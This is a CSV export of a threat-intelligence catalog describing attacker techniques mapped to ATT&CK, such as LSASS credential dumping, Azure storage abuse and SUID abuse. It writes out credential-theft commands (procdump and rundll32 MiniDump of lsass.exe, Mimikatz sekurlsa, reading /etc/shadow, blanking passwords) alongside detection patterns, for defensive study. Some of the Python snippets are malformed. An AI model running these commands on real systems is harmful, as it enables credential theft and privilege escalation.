UUID,Name,Type,Tlp,Description,Version,Created,Modified,Childs,Parents,Chaining,Threat Actors,ATT&CK
f3a392f7-3268-4c54-8bfa-8117b784f520,DLL Execution over Rundll32,Threat Vectors,clear,"Rundll32.exe is a powerful asset for adversaries to proxy execution of arbitrary
and malicious code. It is flexible and efficient for loading code into memory,
as may load malicious DLLs by ordinals, function names or directly.
Rundll32.exe has a certain degree of trust; which can result in a possible
AppLocker and Software Restriction Policies (SRP) bypass.

Adversaries rely on distinct vectors to infect their targets, who might get
infected. Upon successful exploitation, malicious actors have been seen executing
DLL files using Rundll32.exe for multiple purposes; such as download and execute a
payload from a remote server (DLL path could be both local and remote when the DLL
is hosted on a SMB share using UNC paths), contact C&C server to upload stolen data
or dump LSASS process memory to obtain credentials.
",2,2023-07-25,2025-10-01,,,,"[Mobile] APT28, APT28, [Mobile] Sandworm Team, GreyEnergy, [Enterprise] HAFNIUM, HAFNIUM, [Enterprise] Magic Hound, TA453, [Enterprise] Blue Mockingbird, [Enterprise] MuddyWater, MuddyWater, [Enterprise] TA505, TA505",T1218.011
c856d1b5-b351-49ad-b8f4-8ab9720ba510,Azure - Storage blobs data collection,Threat Vectors,clear,"The threat vector refers to techniques used by attackers to discover, enumerate, 
and exfiltrate data from Azure Blob Storage containers, often due to misconfigurations 
that allow unauthorized or public access to sensitive data. This is commonly known 
as ""blob hunting"" and is a significant risk for organizations using cloud storage.

## Attack Techniques

### 1. Blob Hunting and Enumeration

- **Blob Hunting**: Attackers attempt to discover Azure storage accounts, containers, 
and blobs by guessing or brute-forcing names, leveraging predictable naming conventions, 
or using automated tools such as MicroBurst and BlobHunter.
- **Enumeration Process**:
  - **Storage Account Discovery**: Attackers identify potential storage account 
  names, often using subdomain enumeration or company naming conventions (e.g., `companyname.blob.core.windows.net`).
  - **Container Enumeration**: Once the account is found, attackers guess or enumerate 
  container names, which are often generic (e.g., ""images"", ""backups"").
  - **Blob Listing**: If a container allows anonymous access, attackers can list 
  and access all blobs within it, potentially exposing sensitive files.

### 2. Exploiting Misconfigurations

- **Public Access Settings**:
  - **Private Access**: Only authorized users can access data (most secure).
  - **Blob Access**: Anyone with the blob URL can access the data, but cannot list 
  all blobs.
  - **Container Access**: Anyone can list and access all blobs in the container, 
  if they know the container name.
- Attackers exploit misconfigurations where containers are set to ""Blob"" or ""Container"" 
access, allowing unauthorized data collection.

### 3. Automated Tools

- **BlobHunter**: Scans Azure blob storage for publicly accessible blobs and reports 
misconfigured containers.
- **MicroBurst**: Automates enumeration and brute-forcing of storage account and 
container names.
- **Legitimate Tools Misused**: Tools like Azure Storage Explorer and AzCopy can 
be used by attackers for bulk data exfiltration if credentials or access are compromised.
",3,2025-06-17,2025-09-08,,,"{'support::enabled': ['2743bf18-3b86-4721-bf3e-153dcda0b149', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1530, T1119, T1078"
2d0beed6-6520-4114-be1f-24067628e93c,Manipulation of credentials stored in LSASS,Threat Vectors,clear,"Credentials can be stored in the Local Security Authority Subsystem
Service (LSASS) process in memory for use by the account. LSASS stores
credentials in memory on behalf of users with active Windows sessions.
LSASS can store user or system credentials in several different ways: 
Reversibly encrypted plaintext, Kerberos Tickets, NT hashes or LM
hashes. 

The threat actors can harvest these credentials with an administrative
user or SYSTEM. Administrative accounts are used by users to carry out
tasks that require special permissions, such as installing software or
renaming a computer and they need higher administrative privileges. In
the most cases the threat actors are using different tools to manipulate
the credentials in LSASS process in memory, for example: Mimikatz, Cobalt
Strike, Impacket, Metasploit, PowerSploit, Empire, Pwdump, Dumpert and
others.

Mimikatz is a tool that allows an attacker to extract clear text passwords,
hash values, and Kerberos tickets from LSASS. The tool can be used to
retrieve password information for a user account that is currently logged
into a system, or to extract the hashes of all user accounts on a system,
which can then be used to perform offline password cracking.

By manipulating LSASS, an attacker can gain access to sensitive information,
such as passwords and other credentials, and use that information to
compromise the security of a system or network.

For example, on thetarget host threat actors can use procdump:

procdump -ma lsass.exe lsass_dump

Example for a local credential dumping from LSASS memory with Mimikatz
sekurlsa:

sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords

Example for process dumping memory of lsass.exe to obtain credentials.
Threat actors are using dynamic-link libraries (DLLs) like Rundll32 to
manipulate the process in LSASS memory.

rundll32 C:\windows\system32\comsvcs.dll MiniDump lsass.dmp

OR

process == rundll32.exe
&&
command_line_includes ('MiniDump')

Example for a process that access LSASS memory:

process == ('powershell.exe' || 'taskmgr.exe' || 'rundll32.exe' || 'procdump.exe' 
|| 'procexp.exe' || [other native processes that don’t normally access LSASS]) &&
cross_process_handle_to ('lsass.exe')

Threat actors can use PowerShell scripts to request process access to
lsass.exe process (an example for access to PROCESS_ALL_ACCESS – 0x1F0FFF
process):

$Handle = [Uri].Assembly.GetType('Microsoft.Win32.NativeMethods')::OpenProcess(0x1F0FFF, $False, (Get-Process lsass).Id)

If the key value pair in the registry for LSASS is changed to 1, this
is an indicator that the passwords are stored in cleartext in LSASS memory.

Example for a DWORD in the registry: 

HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/SecurityProviders/WDigest/UseLogonCredentia
",4,2023-01-31,2025-10-01,,,,"[Mobile] APT28, APT28, [ICS] FIN6, FIN6, [Enterprise] Leviathan, APT40, [Enterprise] Fox Kitten, Fox Kitten, [Enterprise] MuddyWater, MuddyWater","T1003.001, T1218.011, T1098, T1003"
1c1c9665-a30e-479b-bd80-1afb7b53ac83,Compromised software packages,Threat Vectors,clear,"Compromised software packages in a supply chain attack refer to the
intentional or unintentional inclusion of malicious code or vulnerabilities
in software components, libraries, or dependencies that are used by multiple
organizations or products. This type of attack targets the software supply
chain, which includes all the organizations, people, and processes involved
in designing, developing, testing, building, delivering, and maintaining
software.

### Types of compromised software packages

- Malicious libraries or dependencies: Open-source or third-party libraries
that contain malicious code, which can be used to steal sensitive data,
disrupt operations, or create backdoors.
- Tampered software updates: Legitimate software updates that have been
compromised by an attacker, allowing them to inject malware or backdoors
into the updated software.
- Infected software components: Software components, such as DLLs or
executables, that contain malware or vulnerabilities, which can be
used to compromise the entire system.
- Fake or counterfeit software: Software that is intentionally designed
to mimic legitimate software, but contains malware or vulnerabilities.
- Typosquatting attacks: This type of approach includes a small changes
in the name of the software packages. In this way is very difficult to
recognise a malicious from a legitimate software package for installation.
The packages with names similar to legitimate ones could be deceiving and
easily lure the victim to download and use them. 

### Dependency poisoning 

Threat actors can add intentional vulnerabilities to open-source libraries
by exploiting their accessibility. Such example is typosquatting attacks
in which an adversary uploads malicious packages with names similar to
popular NPM or PyPI libraries to trick developers into downloading
the wrong one. Threat actors can also inject malicious code into trusted
libraries,for example: Log4j, NPM, or PyPI, compromising thousands of
applications that rely on them. This type of attack, often referred
to as “supply chain poisoning,” can have a massive impactful
consequences. ref [2].  

It's recommended a security officer to establish robust policies for
evaluating, approving, and managing open-source libraries. This includes
selecting packages from trusted sources and monitoring their activity.",1,2025-04-15,2025-04-22,,,{'atomicity::implements': ['78683822-44dc-41ac-8fef-b5f0968743c9']},"UNC2452, APT29, [Enterprise] APT29, [Enterprise] HAFNIUM, HAFNIUM, [Enterprise] menuPass, APT10, [Enterprise] Ke3chang, APT15, [ICS] Lazarus Group, Lazarus Group","T1546.016, T1195"
d24fcc84-0e1e-41e1-8d0e-6ee9f8c6a068,Azure - File Share Mounting,Threat Vectors,clear,"In the following threat vector, adversaries leverage Azure Storage Account File 
Shares via NFS or SMB mounts to facilitate or escalate attacks.

## Example Attack Scenario

A typical scenario begins with an attacker stealing or hijacking privileged credentials, 
for example through a “Pass the Cookie” attack on a global administrator account. 
After obtaining administrative access, the adversary extends permissions to external 
users and assigns them high-level roles within the Azure tenant. Leveraging this 
privileged access, the adversary mounts Azure file shares to their own infrastructure, 
laying the groundwork for:
- Massive data exfiltration through direct access to sensitive storage.
- Encrypting and holding file shares hostage for ransom (ransomware).
- Stealthily manipulating or deleting critical business data, including Azure backup sets.

## Attack Goals and Impact

The adversary’s core objectives when mounting file shares are:
- **Data Exfiltration:** Copying sensitive or proprietary data undetected from the 
cloud environment via NFS or SMB mount.
- **Ransomware Operations:** Encrypting contents of file shares directly, disrupting 
business continuity and demanding ransom payments for decryption.
- **Persistence and Shadow IT:** Creating redundant access paths or mirroring content 
to maintain long-term presence within the victim's environment.
- **Operational Disruption:** Deleting or corrupting critical files and backups 
to elevate operational risks and pressure response teams.

## Attack Flow and Methodology

The typical methodology for File Share Mounting attacks involves these steps:
- **Credential or Key Theft:** Adversaries obtain necessary Secrets, Shared Access 
Signatures (SAS), or access keys for a Storage Account, or elevate privileges to 
write and mount shares.
- **Generate/Enumerate Connection Strings:** Using their access, attackers create 
connection strings to Azure Storage File Shares, selecting NFS or SMB protocols 
as supported.
- **Mount File Shares:** The adversary mounts the target file shares to attacker-controlled 
machines or servers, treating Azure storage as a local/network drive.
- **Execute Objectives:** With direct file system access:
  - Download or exfiltrate data covertly.
  - Upload and execute ransomware, encrypt data, or sabotage backups.
  - Copy, modify, or delete content to facilitate further lateral movement or persistent threats.
- **Evasion:** These actions often evade Azure default audit logging, as connections 
to the mounted file shares are typically not logged within Azure's native monitoring 
tools by default, reducing detection opportunities.

## How the Adversary Generates the Connection String
The connection string typically contains the Storage Account name, File Share name,
and authentication tokens or keys (e.g., SAS tokens or storage account keys).

The attacker must have access to these authentication credentials, which can be 
obtained through compromise or misconfiguration.
With these credentials, the attacker constructs a connection string formatted like:

For SMB:
`\\<storage_account_name>.file.core.windows.net\<file_share_name>`
along with the storage account key or SAS token used for authentication.

For NFS:
A mount command such as
`mount -t nfs <storage_account_name>.file.core.windows.net:/<file_share_name> <local_mount_point>`.

Once mounted, the adversary can read, write, delete, or exfiltrate files directly from the 
file share as though it were a local drive.
",1,2025-09-09,2025-09-10,,,"{'support::enabled': ['53f4e2f0-7d11-4629-bb26-905993a589db', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '2743bf18-3b86-4721-bf3e-153dcda0b149'], 'support::synergize': ['942ed69c-700a-469a-9591-07b87815a909', '85c8e0dd-b012-402d-bb09-5d354c16ebb9'], 'sequence::preceeds': ['518ff777-f10d-4201-9e54-2779c31c512e']}",,"T1039, T1530, T1021.007"
52cd3405-ddd8-40cd-be83-640a21c2b4c4,Abuse of special permission via chmod on files,Threat Vectors,clear,"Attackers leverage the `chmod` utility to set the SUID (Set Owner User ID), 
the SGID (Set Owner Group ID), or the Sticky bit on executables or scripts. 
By abusing these bits, an adversary can temporarily inherit root- 
or group-level privileges when the affected file is executed.  

This effectively grants them elevated rights that can be used to move laterally 
within the environment, access or exfiltrate sensitive data, or escalate 
privileges to maintain a stronger foothold on the system.  

Examples of SUID, SGID, and Sticky bit abuse:

SUID shell: Attackers can create a file with the setuid bit set and owned
by the root user, and then use that file to gain root privileges and 
execute a shell with root privileges.

SGID exploit: Attackers can find a file with the setgid bit set and owned
by a group that has elevated privileges, and then use that file to gain the
privileges of that group.

Sticky bit exploit: Attackers can set the sticky bit on a file to prevent
it from being deleted or renamed, and then use that file to store malicious
code or data.

In many Linux-based distributions (and similarly on macOS systems), 
`chmod` is widely available and not restricted in typical configurations. 
Attackers can take advantage of this by running commands such as:

```bash
chmod u+s /path/to/executable
```

or

```bash
chmod g+s /path/to/executable
```
Depending on permissions misconfigurations, these commands may succeed if the 
account in use has the necessary rights or if the system’s sudo settings 
are overly permissive.  

Once the SUID or SGID bit is set on a critical binary, any user running that 
binary subsequently executes it with elevated privileges. Threat actors have 
been observed employing this technique to gain root-level access, tamper with 
system logs, exfiltrate proprietary data, or introduce backdoors for persistence.  
",1,2025-01-13,2025-01-16,,,,"[Enterprise] TeamTNT, TeamTNT, [ICS] APT38, Lazarus Group, [ICS] Wizard Spider, UNC1878",T1548.001
06523ed4-7881-4466-9ac5-f8417e972d13,Using a Windows command prompt for credential manipulation,Threat Vectors,clear,"Threat actors may use Windows commad prompt commands to search for, access
in order to manipulate (create, modify, delete, read) user's credentials
locally or in a domain. For example, they can extract user's passwords from
Credential Manager. Windows Credential Manager is a store with all user's
saved passwords automatically during user daily work. It provides an
interface from where the credentials can be managed. To access Credential
Manager, the threat actor needs to elevate his previleges to administrator
and run the command promt console with ""Run as administrator"".

Cmdkey.exe is a command-prompt utility which can create, list, and delete
stored user names and passwords or credentials. It's usually located in the 
%SYSTEM% sub-folder and its usual size is around 13,850 bytes.

Example for try to gain user's details with cmdkey from Windows Credential
Manager:

cmdkey /list:testTarget

The command returns the Target(testTarget), Type(Domain Password), and the
Username(testUser).

A threat actor can also manipulate the Credential Manager database, for
example to add, modify or delete credentials from manager sections. It is
possible to add an Internet or network address, user name, password and
others.

Example for adding of entry in Credential Manager. With the command below
a threat actor can add username-password key pair for access to specific
system.

cmdkey /add:computer-name /user:user-name /pass:your-password

Example for deletion of entry in Credential Manager. A threat actor fist
execute list command to see all potential targets and select an entry for
deletion.

cmdkey /list
cmdkey /delete:target-name

Another approach to search and retrieve user's credentials with command
promt is for example with net utility. Net utility executed via the network 
is used to query for user's password. The passwords can be storred on shared
network drives or locally.

Example:

net use \\unc\path /user:username password

or 

net use \\%userdnsdomain% /user:%userdomain%\%username% *

The asterisk at the end forces to ask for password.

With net utility a threat actor can also modify already existing user name
or password or to delete the existing credentials entry. 

Examples: 

net user <username> *
<type a new password>
<retype the new password to confirm>

The command below will set the password to blank:
net user username """" 

The following command will remove the password for the user with the
specified userneme:

net user <username> /passwordreq:no
",3,2023-01-26,2023-01-26,,,,"[Enterprise] Deep Panda, APT19, [Enterprise] APT32, APT32, [Enterprise] APT39, APT39, [ICS] Dragonfly, ENERGETIC BEAR, [ICS] FIN6, FIN6, [ICS] FIN7, FIN7, [Enterprise] Fox Kitten, Fox Kitten, [ICS] OilRig, OilRig, [Enterprise] APT29, UNC2452","T1059.003, T1098.001"
50c7e353-ac1c-48a7-8c98-2515b45f31f4,Persistence through automation runbooks in Azure,Threat Vectors,clear,"Persistence through automation runbooks in Azure is a robust and often-overlooked 
technique that allows attackers to maintain privileged access in cloud environments 
by leveraging Azure Automation Accounts and their associated runbooks.

### Attack Flow and Techniques

**1. Attack Lifecycle**  
- The attacker compromises an Azure account or system and escalates privileges, 
often to Global Administrator.
- After initial access is revoked or remediated, the attacker uses Automation Accounts 
to regain or maintain access to the Azure tenant.

**2. Runbook Creation and Modification**  
- Attackers create a new Automation Account with excessive privileges (such as ""User Administrator"" or ""Subscription Owner"") 
or leverage an existing one.
- A malicious runbook (typically a PowerShell script) is uploaded or an existing runbook is modified. These scripts can:
  - Create new Azure AD users or service principals with high privileges.
  - Deploy payloads (e.g., Cobalt Strike beacons) on Azure VMs.
  - Mimic legitimate processes through naming conventions (e.g., ""SplunkDev"" for Automation Account, ""AzureAutomationMonitor"" for runbook).

**3. Webhook Integration**  
- The malicious runbook is linked to a webhook, enabling remote execution via HTTP 
POST requests without direct authentication.
- This allows attackers to regain access on demand, even after their original accounts 
are removed.

**4. Privilege Retention and Escalation**  
- Automation Accounts are configured with password or certificate-based authentication, 
providing multiple avenues for re-entry.
- Attackers may assign or retain excessive permissions to ensure the malicious runbook 
can escalate privileges or create new backdoor accounts.

**5. Hybrid Runbook Workers**  
- Attackers may use Hybrid Runbook Workers, which run outside Azure’s sandbox and 
are not subject to the same execution time limits. This allows for more complex 
or long-running malicious tasks.

**6. Backdooring Packages and Runtime Environments**  
- Beyond runbooks, attackers can backdoor the packages and runtime environments 
(modules and Python packages) that support Automation Accounts. Malicious code can 
be embedded in these components, providing even deeper persistence.
",1,2025-05-20,2025-05-21,,,,,"T1098, T1204"
707bf160-5d78-42cc-85d3-e4831f62357c,Scheduled tasks to execute binaries,Threat Vectors,clear,"A threat actor can use scheduled tasks to execute binaries such as LOLBINs
or malware. LOLBINs is short for 'living off the land binaries', which
means that the threat actors often use native Windows binaries to try to
hide malicious activity.

A scheduled task to execute a binary is a way for an attacker to ensure 
that binaries of their choosing and with their settings are run
automatically at a specific time or on a regular basis. Scheduled tasks can
be set up to run a malicious binaries or LOLBINs in a number of ways, such
as through the use of the built-in task scheduler in Windows. Once the
scheduled task is created, it will run the specified binary at the
designated time. It is important to regularly check and disable any
suspicious scheduled tasks to protect against this type of attack.
",4,2022-12-14,2022-12-20,,,,"[Enterprise] HAFNIUM, HAFNIUM, [Enterprise] APT29, UNC2452, [ICS] FIN7, FIN7, [Enterprise] Gamaredon Group, Gamaredon Group",T1053.005
b1593e0b-1b3b-462d-9ab6-21d1c136469d,Azure - Gather Resource Data,Threat Vectors,clear,"The “Gather Resource Data” technique is a key part of the reconnaissance phase in 
attacks against Azure environments. This activity focuses on enumerating information 
about resources within a target Azure tenant or subscription to support subsequent 
attack phases.

#### Example Attack Scenario

A threat actor gains access to a compromised identity in an Azure environment, such 
as via phishing or a leaked credential. Using this access, the attacker enumerates 
accessible resources (e.g., virtual machines, storage accounts, databases, and identity 
configurations) by executing read operations like `{resource}/*/read`. For example, 
if the account has Reader or even limited permissions, the attacker can list resource 
groups, virtual machines, Key Vaults, storage accounts, and see details such as 
configurations, names, and metadata. They might also list the names of secrets or 
certificates in a Key Vault—while unable to access the contents without elevated 
permissions, this reconnaissance helps prioritize attack targets.

#### Attack Goals and Impact

- **Goals:**
  - Develop a comprehensive map of the organization’s Azure environment.
  - Identify high-value resources (e.g., storage accounts with sensitive data, Key 
  Vaults, privileged identities).
  - Find weakly configured, over-permitted, or exposed resources (public endpoints, 
  misconfigured access policies).
  - Inform next stages of the attack (privilege escalation, lateral movement, data theft).

- **Potential Impact:**
  - **Accelerated compromise:** With detailed resource and configuration information, 
  attackers can quickly focus on the most lucrative or vulnerable targets.
  - **Increased stealth:** Attackers can tailor subsequent steps to avoid detection—targeting 
  overlooked or poorly monitored resources.
  - **Data exposure:** Identification of exposed storage or secrets can result in 
  immediate or subsequent sensitive data breaches.

#### Attack Flow and Methodology

1. **Automated Enumeration:** Utilizing Azure CLI, PowerShell (e.g., `Get-AzResource`, `az resource list`), 
REST APIs, or scripts, the attacker lists:
  - Resource groups and their contents
  - Virtual machines, storage accounts, databases, and Key Vaults
  - Permissions and access policies associated with resources
2. **Asset Profiling:** The attacker collects details on configurations, public IPs, 
RBAC permissions, and metadata for each resource.
3. **Vulnerability Identification:** Analysis focuses on resources where permissions, 
network exposure, or configurations suggest potential for privilege escalation or data access.
4. **Preparation for Next Stages:** The attacker plans lateral movement, privilege 
escalation, or direct attacks on data, using the knowledge obtained to target weak points.
",2,2025-08-07,2025-09-04,,,"{'sequence::succeeds': ['66aafb61-9a46-4287-8b40-4785b42b77a3', '9bb31c65-8abd-48fc-afe3-8aca76109737']}","Volt Typhoon, HAFNIUM, FIN13, [Enterprise] Salt Typhoon","T1526, T1087, T1552.001, T1530"
b5e8300c-6887-48c2-a18d-e3d910478fe8,Retrieve browser cookie with Python,Threat Vectors,clear,"Cookies contain information stored in a user browser, such as session state and
user preferences. There are multiple ways to retrieve browser cookies using Python.

Here are several commonly used methods in Python to obtain browser cookies
along with example code:

1. Use the Selenium library to retrieve browser cookies.

  from selenium import webdriver

  Initialize the browser driver
  driver = webdriver.Chrome()

  Open the webpage
  driver.get(""http://www.example.com"")

  Retrieve browser cookies
  cookies = driver.get_cookies()

  Print the cookies
  for cookie in cookies:
      print(cookie)

  Close the browser
  driver.quit()
  
2. Using the browser developer tools to retrieve browser cookies

  import requests

  send HTTP requests
  response = requests.get(""http://www.example.com"")

  get response about Cookies
  cookies = response.cookies

  print out Cookies
  for cookie in cookies:
      print(cookie.name, cookie.value)   
      
3. Saving cookies from the browser developer tools as a HAR (HTTP Archive) file

  In the Network panel of the browser developer tools, select a request, right-click,
  and choose “Save All as HAR with Content” to save the request and response as a
  HAR file. Then, use Python to parse the HAR file and extract the cookie information.

  The following is an example code demonstrating how to parse browser cookies using a HAR file:

  import json

  read HAR file
  with open(""example.har"", ""r"") as file:
      har_data = json.load(file)

  extract Cookies information
  cookies = har_data[""log""][""entries""][0][""response""][""cookies""]

  print out Cookies
  for cookie in cookies:
      print(cookie[""name""], cookie[""value""])
    
    
4. Use the browsercookie Python module that loads cookies used by the web browser into a
   cookiejar object. This can be useful to download the same content seen in the
   web browser without needing to login.
    
  import urllib.request
  public\_html = urllib.request.urlopen(url).read()
  opener = urllib.request.build\_opener(urllib.request.HTTPCookieProcessor(cj))
  ",1,2024-11-05,2024-11-05,,,"{'sequence::succeeds': ['ec8201d4-c135-406b-a3b5-4a070e80a2ee'], 'atomicity::implements': ['b0d6bf74-b204-4a48-9509-4499ed795771']}",,T1111
901dd804-00cc-4034-85aa-3d10e257c16c,DNS over HTTPS tunneling exfiltrates data or communicates to C&C server,Threat Vectors,clear,"DNS over HTTPS (DoH) tunneling is a technique used by threat actors
to exfiltrate data or communicate to a Command and Control (C&C)
server. The data exchange and transfer between the victim and the
attacker's server can include - data exfiltration (stolen data) as
confidential documents or files, PIIs, financial data or intellectual
property. The data flow can be also an administrative traffic like
covert C&C communication, for example - chat or messaging traffic,
file (malicious payload) transfers, system control, manipulation
instructions and other possible signaling or instructions transfer.

DoH is a protocol that encrypts DNS requests and responses, making
it more difficult for third parties to intercept and manipulate DNS
traffic. However, threat actors have found a way to exploit this
protocol for malicious purposes ref [1].      

In a DoH tunneling attack, the threat actor uses the DoH protocol
to encapsulate malicious data, such as stolen credentials, sensitive
information, or malware, within DNS requests. The encrypted DNS requests
are then sent to a C&C server, which can be hosted on a compromised domain
or a domain controlled by the threat actor ref [2].    

A threat actor can use some of the following initial access techniques
or methods to perform DNS over HTTPS tunneling:   

- Compromises a device: Gains access to a victim's device, either through
phishing, exploiting vulnerabilities, or using malware.
- Installs malware: Installs malware on the compromised device, which can
be designed to collect sensitive information, such as login credentials
or personal data.
- Configures DoH: Configures the device to use DoH, either by modifying
the device's DNS settings or by installing a malicious DoH client.
- Encapsulates data: Encapsulates the stolen data within DNS requests,
using techniques such as:
- Data encoding: Encoding the data using techniques like Base64 or
hexadecimal encoding.
- Data fragmentation: Breaking the data into smaller fragments and
sending them across multiple DNS requests.
- Sends DNS requests: Sends the encrypted DNS requests to the C&C
server, which can be hosted on a compromised domain or a domain
controlled by the threat actor.
- Exfiltrates data: The C&C server receives the DNS requests, extracts
the encapsulated data, and stores or forwards it to the threat actor.
",2,2025-04-22,2025-05-08,,,,"[Enterprise] APT3, APT3","T1572, T1036, T1041, T1190, T1566"
777e22c5-e47d-42a2-a803-42a101dee575,IP Discovery in Azure,Threat Vectors,clear,"IP Discovery in the context of Azure refers to an adversary’s technique for identifying 
the public IP addresses associated with Azure resources. This activity is classified 
in the Azure Threat Research Matrix (ATRM) under **reconnaissance** tactics, because 
it is often one of the first steps attackers perform to understand the accessible 
surface of a target Azure environment.

#### Attack Flow and Methodology

1. **Initial Reconnaissance**  (see terrain)
  The attacker needs valid credentials or otherwise access to an Azure environment 
  
2. **Enumerating Resources**  
  Using the Azure Portal, the Azure CLI, PowerShell, or Azure REST APIs, they enumerate 
  resources—especially focusing on Virtual Machines (VMs) and Network Interfaces (NICs).

3. **Querying for IP Information**  
  The attacker issues read requests (such as `az network nic list`, `Get-AzNetworkInterface`, 
  or relevant API calls) to retrieve detailed information about NICs. Each NIC 
  object includes properties for associated public and private IP addresses.

4. **Mapping IPs to VMs**  
  From the NIC information, the adversary can link public IPs back to specific 
  VMs or other endpoints, thereby building a map of accessible resources and potential 
  entry points.

#### Attack Goals and Impact

- **Surface Mapping:** Generate a list of exposed public IP addresses and their 
associated Azure resources.
- **Prioritizing Targets:** Identify potentially vulnerable endpoints for direct 
attack (RDP, SSH, web services) or for scanning later.
- **Avoiding Detection:** Reconnaissance is “low and slow”—often blends in with 
administrative activity, making detection challenging unless closely monitored.

#### Example Attack Scenario

1. **Enumeration:**  
  ```
  az network nic list --query ""[].{Name:name, IP:ipConfigurations[].publicIpAddress.id}""
  ```
  Or use the Azure REST API to enumerate all NICs and their attached public IPs.

2. **Data Correlation:**  
  Map discovered IPs to VMs using the relationships expressed in the Azure resource objects.

3. **Follow-Up:**  
  The attacker now has a list of direct IPs to probe for vulnerabilities 
  (e.g., open RDP or SSH ports, misconfigured firewalls).
",1,2025-07-30,2025-08-04,,,,,"T1078, T1526, T1528"
75415bc5-6615-487e-a69c-7a4ffc196996,Lateral movement using Impacket framework,Threat Vectors,clear,"Threat actors conduct lateral movement with valid network credentials
obtained from credential harvesting. To conduct lateral movement more
efficiently, they typically use modules from the publicly available
Impacket framework ref [1].    

Some of the activities during the lateral movement might be:

- Enumerate the volume of a device (example: PS get-volume), 
  access volumes via network shares like \\127.0.0.1\ADMINS$\__  
- Copying critical registry hives that contain password hashes
  and computer information.  
- Downloading files directly from actor-owned infrastructure
  (example: cmdlet: DownloadFile)  
- Extract both system and security event logs into operational
  directory (example: Win32_NTEventlogFile cmdlet) 

Variety of reports and analysis show that the threat actor commonly
deletes files used during operational phases seen in lateral movement.

In some cases the threat actors may try to manipulate the Group Policies
to hide their traces. For example, the registries which are related to
the access of the System Registries. They may also try to turn off `Audit
object access` for successful and failed access events. ref [2, 3]  
",1,2024-09-17,2024-09-18,,,{'sequence::succeeds': ['3b1026c6-7d04-4b91-ba6f-abc68e993616']},"[Enterprise] Ember Bear, DEV-0586","T1021, T1059.001, T1552.002"
3b1026c6-7d04-4b91-ba6f-abc68e993616,Abusing Lolbins to Enumerate Local and Domain Accounts and Groups,Threat Vectors,clear,"Adversaries may attempt to enumerate the environment and list all
local system and domain accounts or groups.  
To achieve this purpose, they can use variety of tools and techniques.  
Their goal is reconnaissance, gathering of user's account information on 
the system or in the domain and further usage of accounts with higher 
privilege access.


### For Windows OS:

On Windows platforms threat actors can use the net utility or dsquery,
as examples as lolbins. Net utility commands, as examples, are executed
with additional parameters like ""net localgroup"", ""net user"" for
administrators and guest accounts. For domain users and groups net
utility commands are used with the parameter /domain.  

Examples:   

- net user /domain
- net group /domain
- net localgroup on localhost
- net user on localhost
- net localgroup ""Administrators"" on localhost

Executable files net.exe or net1.exe are indicators for accounts enumeration.
""Net1.exe"" resides in ""C:\Windows\System32"" like ""net.exe"" and indicates process 
known as Net Command or Application Installer. These .exe files are usually related 
to run applications, batch files, and scripts that call Net utility.  

Threat actors may enumerate currently or previously connected users, or a subset
of users as for example administrative users.  

### For Linux OS (including Windows Subsystem for Linux):

Here some example of commands typically used for discovery on accounts 
and groups.

- whoami        #current user (often used in legitimate scripts)
- hostname      #show or set the system's host name
- id            #print real and effective user and group IDs
- uname         #print system information
- arp
- users
- netdiscover
- ifconfig	  #configure a network interface
- nmap
- ps            #report a snapshot of the current processes
- netstat
- uname
- issue
- groups
- tcpdump
- sudo -l
- cat /etc/shadow
- cat /etc/passwd # other command could be used to list the content of the file ex: 'less', 'more' etc.
- cat /etc/group  # Groups
- cat /etc/sudoers # File that allocate system rights to users
- last            # most recent login sessions
- ldapsearch      # Get information from LDAP server
- rpcclient       # Command-line utility used to interact with Microsoft RPC protocol. Could be used to enumerate AD
- finger          #  user information lookup command 
",5,2022-11-10,2025-10-01,,,,"[Enterprise] APT29, UNC2452, [Enterprise] APT1, APT1, [Enterprise] Chimera, [Enterprise] APT32, APT32, [Enterprise] Ke3chang, APT15","T1087.001, T1087.002, T1069.001, T1069.002"
